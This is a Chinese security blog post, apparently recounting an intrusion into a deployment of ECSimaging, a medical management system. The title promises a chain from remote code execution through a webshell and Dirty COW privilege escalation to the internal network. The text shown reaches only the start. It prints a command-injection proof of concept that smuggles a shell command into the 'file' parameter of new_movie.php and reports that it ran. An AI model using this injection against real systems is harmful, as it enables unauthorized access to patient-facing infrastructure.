<!DOCTYPE html>
<html lang="zh-cn">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"wanheiqiyihu.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="【实战】从rce到上马到脏牛提权到内网外网信息收集拿到一个战，得知是ECSimaging  这是一个国外的医疗管理系统，长这样 后续我们在github上面找到这套系统的rce漏洞 &#x2F;new_movie.php?studyUID&#x3D;1&amp;start&#x3D;2&amp;end&#x3D;2&amp;file&#x3D;1;pwd 上面是poc  看到成功执行命令。 漏洞分析直接用exp打的没意思 但是ls之后我发现存在一个">
<meta property="og:type" content="article">
<meta property="og:title" content="【实战】从rce到上马到脏牛提权到内网">
<meta property="og:url" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/index.html">
<meta property="og:site_name" content="十三の博客">
<meta property="og:description" content="【实战】从rce到上马到脏牛提权到内网外网信息收集拿到一个战，得知是ECSimaging  这是一个国外的医疗管理系统，长这样 后续我们在github上面找到这套系统的rce漏洞 &#x2F;new_movie.php?studyUID&#x3D;1&amp;start&#x3D;2&amp;end&#x3D;2&amp;file&#x3D;1;pwd 上面是poc  看到成功执行命令。 漏洞分析直接用exp打的没意思 但是ls之后我发现存在一个">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212212721477.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212212853107.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213180055117.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213142620037.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212213224258.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212213255376.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212213536297.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212220132263.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212220453965.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212220928123.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212222541392.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213000743643.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213004422893.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213004538455.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213004917209.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213005306922.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213172555433.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213215105594.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213215111766.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213215121812.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213215136148.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213215826502.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213224256897.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214011120522.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214011226576.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214120834713.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214120725755.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214120934733.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214121014276.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214121120392.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214121203058.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214121416784.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214132424369.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214122437992.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214152912193.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214153404421.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230217225542792.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230217233610003.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230217234742108.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230217234855406.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230217235008559.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215172207850.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215172222517.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215172336987.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215172723491.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215173704248.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215174039550.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215180547553.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215180027818.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215180703617.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215180812102.png">
<meta property="og:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215181730240.png">
<meta property="article:published_time" content="2023-03-07T11:56:50.000Z">
<meta property="article:modified_time" content="2024-01-24T15:29:24.951Z">
<meta property="article:author" content="十三">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212212721477.png">

<link rel="canonical" href="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-cn'
  };
</script>

  <title>【实战】从rce到上马到脏牛提权到内网 | 十三の博客</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">十三の博客</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-ctf做题笔记">

    <a href="/categories/Experience" rel="section"><i class="download fa-fw"></i>CTF做题笔记</a>

  </li>
        <li class="menu-item menu-item-python">

    <a href="/categories/python" rel="section"><i class="download fa-fw"></i>python</a>

  </li>
        <li class="menu-item menu-item-java">

    <a href="/categories/java" rel="section"><i class="download fa-fw"></i>java</a>

  </li>
        <li class="menu-item menu-item-读书笔记">

    <a href="/categories/readbook" rel="section"><i class="download fa-fw"></i>读书笔记</a>

  </li>
        <li class="menu-item menu-item-渗透测试">

    <a href="/categories/penetration" rel="section"><i class="download fa-fw"></i>渗透测试</a>

  </li>
        <li class="menu-item menu-item-基础">

    <a href="/categories/basic" rel="section"><i class="download fa-fw"></i>基础</a>

  </li>
        <li class="menu-item menu-item-轮子">

    <a href="/categories/lunzi" rel="section"><i class="download fa-fw"></i>轮子</a>

  </li>
        <li class="menu-item menu-item-漏洞库">

    <a href="/categories/fuxian" rel="section"><i class="download fa-fw"></i>漏洞库</a>

  </li>
        <li class="menu-item menu-item-工具">

    <a href="/categories/tools" rel="section"><i class="download fa-fw"></i>工具</a>

  </li>
        <li class="menu-item menu-item-代码审计">

    <a href="/categories/daima" rel="section"><i class="download fa-fw"></i>代码审计</a>

  </li>
        <li class="menu-item menu-item-逆向">

    <a href="/categories/nixiang" rel="section"><i class="download fa-fw"></i>逆向</a>

  </li>
        <li class="menu-item menu-item-应急响应">

    <a href="/categories/yingji" rel="section"><i class="download fa-fw"></i>应急响应</a>

  </li>
        <li class="menu-item menu-item-免杀">

    <a href="/categories/miansha" rel="section"><i class="download fa-fw"></i>免杀</a>

  </li>
        <li class="menu-item menu-item-靶场">

    <a href="/categories/bachang" rel="section"><i class="download fa-fw"></i>靶场</a>

  </li>
        <li class="menu-item menu-item-cve申请">

    <a href="/categories/cve" rel="section"><i class="download fa-fw"></i>cve申请</a>

  </li>
        <li class="menu-item menu-item-c语言">

    <a href="/categories/c" rel="section"><i class="download fa-fw"></i>c语言</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="十三">
      <meta itemprop="description" content="潜心学习，不骄不躁">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="十三の博客">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          【实战】从rce到上马到脏牛提权到内网
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-03-07 19:56:50" itemprop="dateCreated datePublished" datetime="2023-03-07T19:56:50+08:00">2023-03-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-01-24 23:29:24" itemprop="dateModified" datetime="2024-01-24T23:29:24+08:00">2024-01-24</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/penetration/" itemprop="url" rel="index"><span itemprop="name">-penetration</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="【实战】从rce到上马到脏牛提权到内网"><a href="#【实战】从rce到上马到脏牛提权到内网" class="headerlink" title="【实战】从rce到上马到脏牛提权到内网"></a>【实战】从rce到上马到脏牛提权到内网</h1><h1 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>拿到一个战，得知是ECSimaging</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212212721477.png" alt="image-20230212212721477"></p>
<p>这是一个国外的医疗管理系统，长这样</p>
<p>后续我们在github上面找到这套系统的rce漏洞</p>
<p><code>/new_movie.php?studyUID=1&amp;start=2&amp;end=2&amp;file=1;pwd</code></p>
<p>上面是poc</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212212853107.png" alt="image-20230212212853107"></p>
